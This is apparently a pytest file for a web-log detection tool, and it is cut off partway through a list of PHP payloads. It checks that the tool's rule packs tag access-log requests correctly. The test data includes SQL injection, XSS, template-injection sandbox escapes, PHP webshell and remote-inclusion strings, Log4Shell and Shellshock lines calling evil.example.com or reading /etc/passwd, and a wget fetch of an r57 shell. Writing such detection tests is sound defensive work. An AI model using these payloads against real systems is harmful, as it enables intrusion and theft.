"""Tests for the rule packs that ship with the tool.

These are the closest thing the project has to acceptance tests for detection:
each case is a payload seen in the wild, asserted to reach the right category.
"""

from __future__ import annotations

from dataclasses import replace
from datetime import UTC, datetime, timedelta

import pytest
import yaml

from logarc.core.activity import ActivityCategory
from logarc.core.event import NormalizedEvent
from logarc.core.evidence import EvidenceRef
from logarc.detect.engine import RuleEngine
from logarc.detect.rulepacks import DEFAULT_RULEPACK_DIR, default_rules
from logarc.detect.rules import load_rules

START = datetime(2024, 5, 1, 12, 0, tzinfo=UTC)


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    return RuleEngine(default_rules())


def request(
    target: str,
    *,
    status: int = 200,
    user_agent: str | None = "Mozilla/5.0",
    seconds: float = 0,
    referer: str | None = None,
) -> NormalizedEvent:
    path, _, query = target.partition("?")
    return NormalizedEvent(
        timestamp=START + timedelta(seconds=seconds),
        client_ip="203.0.113.5",
        evidence=EvidenceRef("access.log", int(seconds) + 1),
        method="GET",
        path=path,
        query=query or None,
        status=status,
        bytes_sent=512,
        referer=referer,
        user_agent=user_agent,
    )


def test_the_bundled_packs_load() -> None:
    rules = default_rules()

    assert len(rules) > 20
    assert DEFAULT_RULEPACK_DIR.is_dir()


def test_every_pack_in_the_tree_contributes_rules() -> None:
    """The packs are grouped into folders, and a folder is easy to lose.

    `default_rules()` returning *something* is not enough: it returned the
    other packs perfectly well while one whole directory went unread. This
    counts files on disk against rules loaded, so a pack that stops being
    reached fails here rather than quietly narrowing what the tool detects.
    """
    on_disk = sorted(DEFAULT_RULEPACK_DIR.rglob("*.yaml"))
    assert on_disk, "the bundled packs are the detection layer; there must be some"

    expected = 0
    for path in on_disk:
        pack = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
        count = len(pack.get("rules") or [])
        assert count, f"{path.relative_to(DEFAULT_RULEPACK_DIR)} holds no rules"
        expected += count

    assert len(default_rules()) == expected


def test_the_packs_are_grouped_by_what_they_are_about() -> None:
    """Attack packs and action packs are separate trees, and a technology pack
    sits beside `global/` rather than inside it. The layout is the
    documentation — someone adding a PHP rule should not have to ask where."""
    names = {
        path.relative_to(DEFAULT_RULEPACK_DIR).as_posix()
        for path in DEFAULT_RULEPACK_DIR.rglob("*.yaml")
    }

    assert any(name.startswith("attack/") for name in names)
    assert "attack/php.yaml" in names, "PHP rules live in one place, by technology"
    assert any(name.startswith("attack/global/") for name in names), (
        "and rules that presume no technology live under global/"
    )


def test_every_bundled_rule_has_a_unique_id() -> None:
    ids = [rule.id for rule in default_rules()]

    assert len(ids) == len(set(ids))


def test_owasp_mappings_use_the_expected_notation() -> None:
    represented = {"A01:2025", "A02:2025", "A03:2025", "A05:2025", "A07:2025", "A08:2025"}
    assert {rule.owasp for rule in default_rules() if rule.owasp is not None} == represented


@pytest.mark.parametrize(
    ("target", "status", "count", "category", "owasp"),
    [
        ("/admin", 403, 1, ActivityCategory.ACCESS_CONTROL, "A01:2025"),
        ("/phpinfo", 200, 1, ActivityCategory.RECONNAISSANCE, "A02:2025"),
        ("/wp-content/plugins/example/", 200, 1, ActivityCategory.RECONNAISSANCE, "A03:2025"),
        ("/p?id=1 UNION SELECT pw FROM users", 200, 1, ActivityCategory.INJECTION, "A05:2025"),
        ("/login", 401, 5, ActivityCategory.CREDENTIAL_ATTACK, "A07:2025"),
        (
            '/p?u=O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}',
            200,
            1,
            ActivityCategory.INJECTION,
            "A08:2025",
        ),
        (
            "/fetch?url=http://169.254.169.254/latest/meta-data/",
            200,
            1,
            ActivityCategory.SSRF,
            "A01:2025",
        ),
    ],
)
def test_matched_rules_carry_2025_annotations(
    engine: RuleEngine,
    target: str,
    status: int,
    count: int,
    category: ActivityCategory,
    owasp: str,
) -> None:
    labelled = engine.label_events(
        [request(target, status=status, seconds=i) for i in range(count)]
    )

    assert all(event.label.category == category for event in labelled)
    assert all(event.label.owasp == owasp for event in labelled)


@pytest.mark.parametrize(
    ("target", "expected"),
    [
        ("/products?id=1 UNION SELECT username,password FROM users", ActivityCategory.INJECTION),
        ("/products?id=1' OR '1'='1", ActivityCategory.INJECTION),
        ("/p?id=1;SELECT pg_sleep(10)--", ActivityCategory.INJECTION),
        (
            "/p?id=1 AND 1=1 UNION SELECT table_name FROM information_schema.tables",
            ActivityCategory.INJECTION,
        ),
        ("/p?id=1; DROP TABLE users--", ActivityCategory.INJECTION),
        # Form encoding, as a browser and most attack tools send it: spaces
        # written as `+`. Found missing by the CSIC 2010 conversion.
        ("/p?id=1%27+OR+%271%27%3D%271", ActivityCategory.INJECTION),
        ("/p?q=1+UNION+SELECT+null%2Cnull--", ActivityCategory.INJECTION),
        # Error-based probing: the payload never returns rows, it provokes a
        # message that names the database. Found missing by the evaluation run.
        ("/p?id=1 AND 1=CONVERT(int,@@version)--", ActivityCategory.INJECTION),
        ("/p?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))", ActivityCategory.INJECTION),
        ("/p?id=1' AND 1=CAST((SELECT current_user) AS int)--", ActivityCategory.INJECTION),
        ("/p?id=1 AND UPDATEXML(1,CONCAT(0x7e,@@datadir),1)", ActivityCategory.INJECTION),
        ("/search?q=<script>alert(1)</script>", ActivityCategory.INJECTION),
        ("/p?next=javascript:alert(1)", ActivityCategory.INJECTION),
        # sqlmap's default boolean-blind series, exactly as it sends them.
        # Every one of these was reaching the rules as nothing at all: the
        # tautology rule wanted the comparison to end at a comment or at the
        # end of the string, and sqlmap wraps it in parentheses, compares with
        # LIKE, or leaves a `%` inside the quoted operand.
        (
            "/search?q=oak%27%29%29%20AND%205481%3D5481%20AND%20%28%28%27SUiH%27%3D%27SUiH",
            ActivityCategory.INJECTION,
        ),
        (
            "/search?q=oak%27%29%20AND%201646%3D4348%20AND%20%28%27fkFQ%27%20LIKE%20%27fkFQ",
            ActivityCategory.INJECTION,
        ),
        (
            "/search?q=oak%25%27%20AND%203812%3D6291%20AND%20%27ZxzJ%25%27%3D%27ZxzJ",
            ActivityCategory.INJECTION,
        ),
        # Column counting, the step between finding the injection point and
        # building the UNION. No rule covered it, so the whole reconnaissance
        # half of a UNION attack was invisible while the UNION itself was not.
        ("/search?q=oak%25%27%20ORDER%20BY%201--%20BwtS", ActivityCategory.INJECTION),
        # Time-based blind without a sleep function: the delay comes from making
        # the database do expensive work instead. `sleep()` is often disabled;
        # this is what sqlmap falls back to, and it is also a small denial of
        # service in its own right.
        (
            "/search?q=%27%20AND%201%3D%28SELECT%20LENGTH%28HEX%28RANDOMBLOB%28200000000%29%29%29%29--%2B",
            ActivityCategory.INJECTION,
        ),
        # Template injection past the arithmetic probe. `{{7*7}}` is how an
        # attacker finds the hole; these are what they send once they have. The
        # rule matched only the probe, so a scan showed its first request and
        # none of the ones that mattered — including the Jinja2 sandbox escape,
        # which is the most-used server-side template RCE payload there is.
        ("/p?tpl={{config.items()}}", ActivityCategory.INJECTION),
        ("/p?tpl={{''.__class__.__mro__[1].__subclasses__()}}", ActivityCategory.INJECTION),
        ("/p?tpl={{file_get_contents('/etc/passwd')}}", ActivityCategory.INJECTION),
        ("/p?name=<%= 7*7 %>", ActivityCategory.INJECTION),
        ("/p?q=#{7*7}", ActivityCategory.INJECTION),
        # PHP, which had no rule of its own at all — every `php` in the packs
        # was a filename pattern. Against the CRS corpus family 933 scored
        # 0.012 over 173 cases, and the two that matched did so through a
        # reconnaissance rule catching a path. These are the shapes an access
        # log can actually see: a wrapper or a URL in a parameter the
        # application is about to include.
        (
            "/index.php?page=php://filter/convert.base64-encode/resource=config",
            ActivityCategory.INJECTION,
        ),
        ("/index.php?file=php://input", ActivityCategory.INJECTION),
        (
            "/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==",
            ActivityCategory.INJECTION,
        ),
        ("/index.php?f=phar://uploads/avatar.jpg/x", ActivityCategory.INJECTION),
        # Remote file inclusion: the parameter is a URL somewhere else.
        ("/index.php?file=http://evil.example.com/shell.txt", ActivityCategory.INJECTION),
        # PHP's own execution functions, named in a parameter.
        ("/p?x=system('id')", ActivityCategory.INJECTION),
        ("/p?x=shell_exec('whoami')", ActivityCategory.INJECTION),
        ("/p?x=passthru('ls -la')", ActivityCategory.INJECTION),
        # A serialised object, which reaches `unserialize` and runs whatever
        # magic method the class exposes.
        ('/p?u=O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}', ActivityCategory.INJECTION),
        # Two command-injection shapes that only matched before because the
        # payload happened to name /etc/passwd — the file caught them, not the
        # injection.
        ("/p?cmd=%0awhoami", ActivityCategory.INJECTION),
        ("/p?c={id,}", ActivityCategory.INJECTION),
        ("/ping?host=127.0.0.1;cat /etc/passwd", ActivityCategory.PATH_TRAVERSAL),
        ('/api?filter={"$where":"1==1"}', ActivityCategory.INJECTION),
        ("/download?file=../../../../etc/passwd", ActivityCategory.PATH_TRAVERSAL),
        ("/download?file=..%2f..%2f..%2fetc%2fpasswd", ActivityCategory.PATH_TRAVERSAL),
        ("/.env", ActivityCategory.RECONNAISSANCE),
        ("/.git/config", ActivityCategory.RECONNAISSANCE),
        # Dependency manifests: how an attacker learns which versions are
        # installed before looking up what they are vulnerable to.
        ("/composer.json", ActivityCategory.RECONNAISSANCE),
        ("/package-lock.json", ActivityCategory.RECONNAISSANCE),
        ("/requirements.txt", ActivityCategory.RECONNAISSANCE),
        ("/backup.sql", ActivityCategory.RECONNAISSANCE),
        ("/phpinfo.php", ActivityCategory.RECONNAISSANCE),
        ("/fetch?url=http://169.254.169.254/latest/meta-data/", ActivityCategory.SSRF),
        ("/fetch?url=file:///etc/passwd", ActivityCategory.SSRF),
    ],
)
def test_known_payloads_reach_the_right_category(
    engine: RuleEngine, target: str, expected: ActivityCategory
) -> None:
    """Asserts the category is among the matches rather than that it won.

    A payload can honestly be two things at once — `file:///etc/passwd` in a
    parameter is both SSRF and an attempt to read a system file — and which one
    leads is a precedence decision, not a detection one. Pinning the primary
    label here would turn a taxonomy judgement into a test failure.
    """
    (labelled,) = engine.label_events([request(target)])

    matched = {label.category for label in labelled.all_labels}
    assert expected in matched, (
        f"{target!r} matched {[label.rule_id for label in labelled.all_labels] or 'nothing'}"
    )


def test_log4shell_is_detected_in_the_user_agent(engine: RuleEngine) -> None:
    (labelled,) = engine.label_events(
        [request("/", user_agent="${jndi:ldap://evil.example.com/a}")]
    )

    assert labelled.label.rule_id == "log4shell_jndi"
    assert labelled.label.category is ActivityCategory.EXPLOITATION


def test_shellshock_is_detected_in_the_user_agent(engine: RuleEngine) -> None:
    (labelled,) = engine.label_events(
        [request("/cgi-bin/x", user_agent="() { :; }; /bin/cat /etc/passwd")]
    )

    assert labelled.label.rule_id == "shellshock"


def test_a_scanner_announces_itself(engine: RuleEngine) -> None:
    (labelled,) = engine.label_events([request("/", user_agent="sqlmap/1.7#stable")])

    assert labelled.label.rule_id == "scanner_user_agent"


def test_directory_enumeration_is_seen_across_requests(engine: RuleEngine) -> None:
    events = [request(f"/admin{n}", status=404, seconds=n) for n in range(25)]

    labelled = engine.label_events(events)

    assert any(item.label.rule_id == "directory_enumeration" for item in labelled)


def test_forced_browsing_that_succeeds_is_seen_across_requests(engine: RuleEngine) -> None:
    """A refusal and a success on admin paths, from one client, inside a window.

    The single request `GET /admin/ 200` is the same line whether an
    administrator sent it or somebody who should not be there did. What
    separates them is what else the client collected, which is why this is a
    window rule.
    """
    refused = [
        request(f"/admin/{name}", status=403, seconds=n * 5)
        for n, name in enumerate(("users", "orders", "keys"))
    ]
    through = [request("/admin/ping", status=200, seconds=20)]

    labelled = engine.label_events([*refused, *through])

    assert any(item.label.rule_id == "forced_browsing_succeeded" for item in labelled)


def test_an_administrator_who_is_never_refused_is_left_alone(engine: RuleEngine) -> None:
    """The control, and the reason `client_error_ratio` is the discrimination.

    A legitimate administrator's admin traffic is a bounce to the login form and
    then successes. A 302 is not a 4xx, so the ratio stays zero and the rule
    above never sees them — which is the whole difference between this rule and
    the false alarm that `admin_area_redirect` used to be.
    """
    events = [
        request("/admin/users", status=302, seconds=0),
        request("/admin/users", status=200, seconds=5),
        request("/admin/orders", status=200, seconds=10),
        request("/admin/", status=200, seconds=15),
    ]

    labelled = engine.label_events(events)

    fired = [item.label.rule_id for item in labelled]
    assert "forced_browsing_succeeded" not in fired, f"fired on an administrator: {fired}"


def test_human_paced_directory_enumeration_is_detected(engine: RuleEngine) -> None:
    seconds = [0, 40, 80, 120, 160, 200, 240, 300]
    targets = [f"/quiet-probe-{n % 6}" for n in range(8)]
    events = [
        request(target, status=404, seconds=offset)
        for target, offset in zip(targets, seconds, strict=True)
    ]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration_low_slow" for item in labelled)


@pytest.mark.parametrize(
    "targets",
    [
        [f"/probe-{n}" for n in range(7)],
        [f"/probe-{n % 5}" for n in range(8)],
    ],
)
def test_low_slow_enumeration_needs_eight_requests_and_six_paths(
    engine: RuleEngine, targets: list[str]
) -> None:
    events = [request(target, status=404, seconds=n * 40) for n, target in enumerate(targets)]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id != "directory_enumeration_low_slow" for item in labelled)


def test_low_slow_enumeration_does_not_count_refused_paths(engine: RuleEngine) -> None:
    events = [request(f"/private-{n}", status=403, seconds=n * 40) for n in range(8)]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id != "directory_enumeration_low_slow" for item in labelled)


def test_refused_paths_are_forced_browsing_rather_than_enumeration(engine: RuleEngine) -> None:
    """Two different behaviours, told apart by what the server answered.

    A wall of 404s is someone finding out what exists. A wall of 403s is
    someone being refused things that do exist. Enumeration used to claim both,
    so forced browsing — the more specific rule — could never win, and the
    access-control category never appeared in a graph at all.
    """
    # Enough requests, paths and speed that the enumeration rule would also
    # cover them if it still counted refusals as discovery.
    events = [request(f"/admin/{n}", status=403, seconds=n) for n in range(25)]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "forced_browsing" for item in labelled)
    assert all(item.label.category is ActivityCategory.ACCESS_CONTROL for item in labelled)


@pytest.mark.parametrize(
    "target",
    [
        "/wp-admin/",
        "/wp-login.php",
        "/wp-includes/wlwmanifest.xml",
        "/wp-content/plugins/wp-file-manager/readme.txt",
        "/xmlrpc.php",
        "/administrator/",
        "/administrator/index.php",
        "/phpmyadmin/",
        "/adminer.php",
        "/admin.php",
        "/shell.php",
        "/test.php",
        "/old/",
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    ],
)
def test_a_probe_for_software_the_site_does_not_run_is_enumeration(
    engine: RuleEngine, target: str
) -> None:
    """One request is enough when the path names software by its own convention.

    The window rules need a burst, and this behaviour does not come in bursts:
    the scanner in the committed excerpt asks for four to six of these, waits
    hours, and asks again. Every one is a 404, so `directory_enumeration_low_slow`
    — which wants eight requests — never fires, and 92 requests the truth calls
    enumeration reached the report as ordinary browsing.

    These paths do not need a burst to be legible. `/wp-admin/` on a site with no
    WordPress is not a mistyped URL.
    """
    (labelled,) = engine.label_events([request(target, status=404)])

    assert labelled.label.category is ActivityCategory.ENUMERATION, (
        f"{target!r} matched {[label.rule_id for label in labelled.all_labels] or 'nothing'}"
    )


@pytest.mark.parametrize("target", ["/wp-admin/", "/phpmyadmin/", "/administrator/"])
def test_the_same_path_answered_normally_is_the_site_running_that_software(
    engine: RuleEngine, target: str
) -> None:
    """The whole discrimination, and the reason the rule can be this broad.

    `/wp-admin/` answered 200 means the site runs WordPress and someone opened
    its admin page. Answered 404 it means the site does not, and someone asked
    anyway. Without the status condition this rule would label every WordPress
    site's own administrator a scanner.
    """
    (labelled,) = engine.label_events([request(target, status=200)])

    assert not labelled.label.category.is_hostile, (
        f"{target!r} at 200 matched {[label.rule_id for label in labelled.all_labels]}"
    )


@pytest.mark.parametrize("target", ["/admin/users", "/admin/", "/administrator/"])
def test_an_admin_path_redirected_to_a_login_form_is_not_an_attack(
    engine: RuleEngine, target: str
) -> None:
    """The first request of every legitimate administrator's visit.

    An application that protects `/admin` with a login form answers an
    unauthenticated request to it with a 302 to that form. So does one being
    probed. The redirect alone does not separate them, and for a long time this
    ruleset acted as though it did.

    Measured on `2026-09-18-medium`, the first corpus to contain an
    administrator doing ordinary work: the rule fired on 179 requests, 13 of
    them hostile and 166 not, a precision of 0.073. Those 166 were 166 of the
    167 false alarms the whole ruleset produced across 236,505 requests — one
    rule accounting for all but one of them.

    It is kept rather than deleted because being sent to a login form is worth
    reporting; it is `authentication` because that is what it is, and it is what
    the ground truth calls all 165 of the administrator's.
    """
    (labelled,) = engine.label_events([request(target, status=302)])

    assert not labelled.label.category.is_hostile, (
        f"{target!r} at 302 matched {[label.rule_id for label in labelled.all_labels]}"
    )


@pytest.mark.parametrize("target", ["/admin.php", "/shell.php", "/phpmyadmin/"])
def test_a_probe_that_sends_no_user_agent_stays_reconnaissance(
    engine: RuleEngine, target: str
) -> None:
    """A client not even pretending to be a browser is already identified.

    The same four paths appear in the excerpt twice: once from a client
    forging a browser User-Agent, which the truth calls enumeration, and once
    from one sending none at all, which it calls reconnaissance. The request
    lines are otherwise identical, so the User-Agent is the only thing that
    separates them — and `absent_user_agent` had already read the second group
    correctly. Without this condition the path rule outranks it and takes 49
    requests that were being reported right.
    """
    (labelled,) = engine.label_events([request(target, status=404, user_agent="")])

    assert labelled.label.category is ActivityCategory.RECONNAISSANCE
    assert labelled.label.rule_id == "absent_user_agent"


@pytest.mark.parametrize("target", ["/.env", "/.git/config"])
def test_a_secret_probe_stays_reconnaissance_rather_than_becoming_enumeration(
    engine: RuleEngine, target: str
) -> None:
    """Where the truth draws the line, and it is not where it first looks.

    Both are 404s for well-known paths, so a rule written by shape alone would
    take them. The dataset's truth calls `/.env` and `/.git/*` reconnaissance
    and `/wp-admin/` enumeration, and the distinction holds up: one is looking
    for a secret that would be readable if present, the other is finding out
    which software is installed. `config_file_exposure` already reads them
    correctly, and the enumeration rule must not outrank it.
    """
    (labelled,) = engine.label_events([request(target, status=404)])

    assert labelled.label.category is ActivityCategory.RECONNAISSANCE
    assert labelled.label.rule_id == "config_file_exposure"


def test_a_redirect_away_from_an_admin_page_is_still_noticed(engine: RuleEngine) -> None:
    """The redirect is reported; what changed is what it is reported as.

    `admin_area_probe` tests 401 and 403, which assumes the server refuses that
    way. Real applications mostly redirect to a login form instead, and a
    redirect is 302 — so on the committed excerpt, where the truth marks 24
    requests `access_control`, that rule reached none of them. This one was
    added to reach them, and it does.

    It was then filed as `access_control` for a month, and that part was wrong:
    a legitimate administrator receives exactly the same redirect. See
    `test_an_admin_path_redirected_to_a_login_form_is_not_an_attack` for the
    measurement that settled it. This test keeps the half that was right — the
    redirect is still something the tool notices and reports — so that a future
    fix for the category cannot quietly stop it firing at all.
    """
    (labelled,) = engine.label_events([request("/admin/users", status=302)])

    assert labelled.label.rule_id == "admin_area_redirect"


def test_reaching_an_admin_page_successfully_is_not_a_refusal(
    engine: RuleEngine,
) -> None:
    """The rule is about being turned away, so a 200 must not match it.

    Widening to "any status" would have reached 19 of the excerpt's 24 rather
    than 13 — and would also have claimed five `injection` and two
    `exploitation` requests as access control, which is a worse answer than
    missing them. A successful admin request is somebody's ordinary Tuesday
    until another rule says otherwise.
    """
    (labelled,) = engine.label_events([request("/admin/users", status=200)])

    assert labelled.label.rule_id not in {"admin_area_probe", "admin_area_redirect"}


def test_a_missing_admin_page_is_not_an_access_control_finding(
    engine: RuleEngine,
) -> None:
    """404 says the thing is not there. 403 says it is there and you may not.

    Those are opposite findings, and this pack already states the distinction —
    `directory_enumeration`'s own comment says "enumeration is finding out what
    exists; a refusal means the thing exists and is protected". `forced_browsing`
    keeps to it with `any_of: [401, 403]`.

    `admin_area_probe` did not: it took `status >= 400`, which sweeps 404 in with
    the refusals. On the committed excerpt every one of its 140 matches on admin
    paths was a 404 or a 400 — not one was a real refusal — and the truth calls
    them enumeration or reconnaissance. It was the worst precision in the pack,
    0.146, and every point of it was this clause.
    """
    (labelled,) = engine.label_events([request("/wp-admin/", status=404)])

    assert labelled.label.category is not ActivityCategory.ACCESS_CONTROL


def test_a_forbidden_admin_page_still_is_one(engine: RuleEngine) -> None:
    """The other half. A 403 is what the rule was always meant to catch."""
    (labelled,) = engine.label_events([request("/admin/settings", status=403)])

    assert labelled.label.rule_id == "admin_area_probe"
    assert labelled.label.category is ActivityCategory.ACCESS_CONTROL


def test_a_script_wearing_an_image_extension_is_not_a_static_asset(
    engine: RuleEngine,
) -> None:
    """`/uploads/shell.php.jpg` was being called an image, because it ends `.jpg`.

    This is the upload-filter bypass: name the file so the check sees `.jpg` and
    the server still hands it to the PHP interpreter. The excerpt carries four of
    these, answered 200, with the command in the query — `?c=id`,
    `?c=cat /etc/passwd`. The truth calls them `exploitation`.

    `is_static_asset` reads the last extension, so all four came back
    `static_asset`: the tool looked at a live webshell being driven and reported
    an image being served. Of everything in this pack, that was the most
    dangerous thing it got wrong.
    """
    (labelled,) = engine.label_events([request("/uploads/shell.php.jpg?c=id")])

    assert labelled.label.category is ActivityCategory.EXPLOITATION
    assert labelled.label.rule_id == "webshell_double_extension"


def test_an_ordinary_image_is_still_an_ordinary_image(engine: RuleEngine) -> None:
    """The guard on the rule above. One extension is not two."""
    (labelled,) = engine.label_events([request("/uploads/holiday.jpg")])

    assert labelled.label.category is ActivityCategory.STATIC_ASSET


def test_a_compressed_archive_is_not_a_webshell(engine: RuleEngine) -> None:
    """`backup.tar.gz` has two extensions and neither is a script.

    Worth a test of its own: a rule written as "any two extensions" would claim
    every compressed file on the internet, and this is the shape it would trip on
    first.
    """
    (labelled,) = engine.label_events([request("/backups/backup.tar.gz")])

    assert labelled.label.rule_id != "webshell_double_extension"


def test_a_fast_page_load_is_not_reconnaissance(engine: RuleEngine) -> None:
    """A browser pulling one page's sub-resources is not a scan.

    Sixty asset fetches inside six seconds is what a single media-heavy page
    looks like over HTTP/2. `rapid_request_burst` keyed on rate alone and
    carried no `member` clause, so it labelled every request in the burst:
    427 static-asset lines of one measured corpus became reconnaissance, and
    not one of the 469 lines it won across that corpus was correct.
    """
    events = [request(f"/assets/img/{n}.png", seconds=n * 0.1) for n in range(60)]

    labelled = engine.label_events(events)

    assert all(item.label.category is ActivityCategory.STATIC_ASSET for item in labelled)


def test_a_page_whose_assets_are_all_missing_is_not_hostile(engine: RuleEngine) -> None:
    """A botched deploy is not an attacker.

    When a page requests sixty assets that are no longer there, every visitor
    produces sixty distinct 404s in six seconds. That clears
    `directory_enumeration`'s 20-in-60s and 15-distinct-paths thresholds, so
    each visitor is reported as enumerating the site.

    Recorded rather than left silent because it is the reason a `status >= 400`
    scope was rejected for the burst rule: keying on error responses fixes the
    healthy page and admits the broken one. The corpus this was measured on
    cannot show it — 41 of its 4,209 client errors are benign — so the case
    lives here instead.
    """
    events = [request(f"/assets/img/{n}.png", status=404, seconds=n * 0.1) for n in range(60)]

    labelled = engine.label_events(events)

    assert not any(item.label.category.is_hostile for item in labelled)


@pytest.mark.parametrize("referer", [None, "https://shop.example.com/catalog"])
def test_five_missing_pages_are_not_low_slow_enumeration(
    engine: RuleEngine, referer: str | None
) -> None:
    events = [
        request(f"/missing-page-{n}", status=404, seconds=n * 20, referer=referer) for n in range(5)
    ]

    labelled = engine.label_events(events)

    assert not any(item.label.category.is_hostile for item in labelled)


def test_one_asset_does_not_break_a_low_slow_window(engine: RuleEngine) -> None:
    events = [request(f"/probe-{n}", status=404, seconds=n * 30) for n in range(8)]
    events.insert(4, request("/missing.png", status=404, seconds=105))

    labelled = engine.label_events(events)

    probes = [item for item in labelled if not item.event.path.endswith(".png")]
    assert all(item.label.rule_id == "directory_enumeration_low_slow" for item in probes)


def test_later_assets_do_not_hide_an_earlier_high_volume_window(engine: RuleEngine) -> None:
    events = [request(f"/probe-{n}", status=404, seconds=n * 2) for n in range(20)]
    events.extend(request(f"/missing-{n}.png", status=404, seconds=40 + n * 2) for n in range(6))

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration" for item in labelled[:20])
    assert "directory_enumeration" not in {label.rule_id for label in labelled[-1].all_labels}


def test_high_volume_window_recovers_after_an_asset_prefix(engine: RuleEngine) -> None:
    events = [request(f"/missing-{n}.png", status=404, seconds=n) for n in range(6)]
    events.extend(request(f"/probe-{n}", status=404, seconds=6 + n) for n in range(20))

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration" for item in labelled[-20:])


def test_assets_around_a_high_volume_window_do_not_hide_it(engine: RuleEngine) -> None:
    events = [request(f"/before-{n}.png", status=404, seconds=n) for n in range(6)]
    events.extend(request(f"/probe-{n}", status=404, seconds=6 + n) for n in range(20))
    events.extend(request(f"/after-{n}.png", status=404, seconds=26 + n) for n in range(6))

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration" for item in labelled[6:26])


def test_high_volume_enumeration_accepts_guard_thresholds(engine: RuleEngine) -> None:
    events = [
        request(
            f"/probe-{n}.png" if n < 4 else f"/probe-{n}",
            status=404,
            seconds=n * 3,
            referer="https://shop.example.com/catalog" if 4 <= n < 8 else None,
        )
        for n in range(20)
    ]

    labelled = engine.label_events(events)

    overlap = [
        item
        for item in labelled
        if {label.rule_id for label in item.all_labels}
        >= {"directory_enumeration", "directory_enumeration_low_slow"}
    ]
    assert overlap
    assert all(item.label.rule_id == "directory_enumeration" for item in overlap)


def test_high_volume_enumeration_rejects_too_many_static_assets(engine: RuleEngine) -> None:
    events = [
        request(
            f"/probe-{n}.png" if n < 5 else f"/probe-{n}",
            status=404,
            seconds=n * 3,
        )
        for n in range(20)
    ]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id != "directory_enumeration" for item in labelled)


def test_high_volume_enumeration_ignores_spoofed_referers(engine: RuleEngine) -> None:
    events = [
        request(
            f"/probe-{n}",
            status=404,
            seconds=n * 3,
            referer="https://shop.example.com/catalog",
        )
        for n in range(20)
    ]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration" for item in labelled)


def test_low_slow_enumeration_ignores_spoofed_referers(engine: RuleEngine) -> None:
    events = [
        request(
            f"/quiet-probe-{n}",
            status=404,
            seconds=n * 40,
            referer="https://shop.example.com/catalog",
        )
        for n in range(8)
    ]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "directory_enumeration_low_slow" for item in labelled)


def test_credential_attack_is_seen_across_requests(engine: RuleEngine) -> None:
    events = [request("/login", status=401, seconds=n * 2) for n in range(20)]

    labelled = engine.label_events(events)

    assert any(item.label.rule_id == "credential_attack" for item in labelled)


def test_an_attack_the_server_locks_out_is_still_an_attack(engine: RuleEngine) -> None:
    """The threshold has to sit below the defence it is watching.

    The excerpt's server rate-limits a login after six failures, and the
    attacker stops there and comes back later. This rule wanted ten in a window,
    so against a server that locks out sooner than the rule counts it could
    never fire at all — 13 requests were reported as a scripted client rather
    than as the credential attack they were part of.

    Five failures on one endpoint inside five minutes is the condition almost
    every authentication system already treats as abnormal. That is what makes
    it a defensible floor rather than a tuned one.
    """
    events = [request("/login", status=401, seconds=n * 20) for n in range(5)]

    labelled = engine.label_events(events)

    assert all(item.label.rule_id == "credential_attack" for item in labelled)


def test_one_fumbled_password_is_not_an_attack(engine: RuleEngine) -> None:
    """The other side of that floor, and the reason it is not lower.

    Someone mistyping a password twice is the most ordinary thing on any login
    page, and it must not reach a report as a credential attack.
    """
    events = [request("/login", status=401, seconds=n * 20) for n in range(2)]
    events.append(request("/login", status=302, seconds=60))

    labelled = engine.label_events(events)

    assert not any(item.label.category.is_hostile for item in labelled)


@pytest.mark.parametrize(
    "target",
    [
        "/",
        "/index.html",
        "/products/shoes",
        "/assets/app.css",
        "/images/logo.png",
        "/search?q=running+shoes",
        "/api/v1/products?page=2",
        "/blog/2024/05/a-post-about-unions",
        "/cart?add=17&quantity=2",
        # Words the error-based injection rule looks for, used innocently.
        "/api/convert?from=usd&to=eur",
        "/docs/version",
        "/api/v1/users/cast-members",
    ],
)
def test_ordinary_traffic_is_not_flagged_as_hostile(engine: RuleEngine, target: str) -> None:
    """False positives on normal browsing would bury the real findings."""
    (labelled,) = engine.label_events([request(target)])

    assert not labelled.label.category.is_hostile, (
        f"{target!r} was flagged as {labelled.label.rule_id!r}"
    )


def test_packs_can_be_extended_with_a_local_pack(tmp_path) -> None:  # type: ignore[no-untyped-def]
    """Investigators add their own detections without touching the code."""
    local = tmp_path / "local.yaml"
    local.write_text(
        """
version: 1
rules:
  - id: house_rule
    name: House Rule
    category: reconnaissance
    severity: low
    match:
      any:
        - field: path_decoded
          contains: '/honeypot'
""",
        encoding="utf-8",
    )

    engine = RuleEngine([*default_rules(), *load_rules([local])])
    (labelled,) = engine.label_events([request("/honeypot")])

    assert labelled.label.rule_id == "house_rule"


#: PHP shapes that reach an access log, one per rule in `attack/php.yaml`, with
#: the evasions the CRS corpus actually uses rather than the ones a rule author
#: would think of unprompted.
PHP_ATTACKS: list[str] = [
    "/p?x=<?php system('id'); ?>",
    "/p?x=<?= $_GET[0] ?>",
    "/p?x=<? exec('wget http://r57.biz/r57.txt'); ?>",
    "/p?x=[php]echo 1[/php]",
    "/p?x={php}phpinfo(){/php}",
    "/p?x=[\\php]echo 1[/php]",
    "/p?x=$_GET[cmd]",
    "/p?x=$_SERVER[DOCUMENT_ROOT]",
    "/p?x=${'_VAR'.'IABLE_NAME'}",
    "/p?x=$ {$a}",
    "/p?x=$$varvar",
    # Every separator the corpus puts between a function name and its paren.
    "/p?x=exec  (blah)",
    "/p?x=exec\t(blah)",
    "/p?x=exec/*comment*/()",
    "/p?x=exec //comment\n (blah)",
    "/p?x=exec #comment\n (blah)",
    '/p?x=return"system"(xyz)',
    "/p?x=@exec('test')",
    "/p?x=call_user_func('system','id')",
    "/p?x=array_map('system', $a)",
